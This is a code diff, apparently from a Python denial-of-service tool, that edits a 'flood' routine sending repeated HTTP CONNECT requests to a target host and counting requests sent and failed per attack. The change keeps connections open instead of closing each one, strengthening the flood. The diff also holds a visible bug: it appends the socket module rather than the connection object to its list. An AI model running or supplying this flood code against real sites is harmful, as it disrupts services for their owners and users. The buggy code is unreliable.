@@ -33,8 +33,8 @@ def flood(attack_id, url, stoptime) -> None:
 
     if not Core.target_host: Core.target_host = urlparse(url).hostname
     if not Core.target_port: Core.target_port = urlparse(url).port if urlparse(url).port else (80 if urlparse(url).scheme == 'http' else 443)
-    if not Core.target_netloc: Core.target_netloc = urlparse(url).netloc
 
+    sockets = []
     while time.time() < stoptime and not Core.killattack:
         if not Core.attackrunning:
             continue
@@ -49,25 +49,26 @@ def flood(attack_id, url, stoptime) -> None:
                     server_hostname=Core.target_host
                 )
 
-            sock.connect( (Core.target_host, int(Core.target_port)) )
+            sockets.append(socket)
+            sock.connect((Core.target_host, int(Core.target_port)))
         
             payload = f'CONNECT' # CONNECT http method
             payload+= f' {Core.target_host}:{str(Core.target_port)}' # target host + port
             payload+= f' HTTP/{Core.http_proto_ver}\r\n' # http protocol version
             payload+= f'Host: {Core.target_host}:{str(Core.target_port)}\r\n' # Host
-            payload+= utils().buildheaders(url, True) # append all headers
-            
-            payload+= 'Content-Length: {len}\r\n'
-            payload = payload.format(len=len(payload))
+            payload+= str(utils().buildheaders(url, True)) # append all headers
+            payload+= '\r\n\r\n'
 
             sock.send(payload.encode()) # and finally send the request  
             Core.infodict[attack_id]['req_sent'] += 1
-
-            sock.close() # close the connection
         except Exception:
             Core.infodict[attack_id]['req_fail'] += 1
 
         Core.infodict[attack_id]['req_total'] += 1
+    
+    for sock in sockets:
+        sock.close() # close the connection
+
     Core.threadcount -= 1
 
 Core.methods.update({
